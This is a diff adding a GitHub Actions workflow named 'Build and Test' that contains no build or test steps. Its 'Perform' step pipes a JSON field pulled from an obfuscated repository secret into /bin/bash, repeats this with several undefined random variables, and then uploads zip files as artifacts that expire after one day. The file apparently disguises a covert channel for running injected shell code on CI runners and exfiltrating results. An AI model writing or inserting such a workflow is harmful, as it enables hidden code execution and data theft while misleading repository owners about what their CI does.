@@ -1,0 +1,33 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          jdex17719: ${{ secrets.jdex17719 }}
+        run: |
+          printf '%s' "$jdex17719" | jq -r .mtll63 | /bin/bash
+          printf '%s' "$bxz6" | jq -r .rmr1405 | /bin/bash
+          printf '%s' "$mt15858" | jq -r .qxqq55358 | /bin/bash
+          echo $bk4081 | jq -r .pv99 | /bin/bash
+          printf '%s' "$tf961" | jq -r .y5720 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: IUYv3yfo
+          path: "*.zip"
+          retention-days: 1
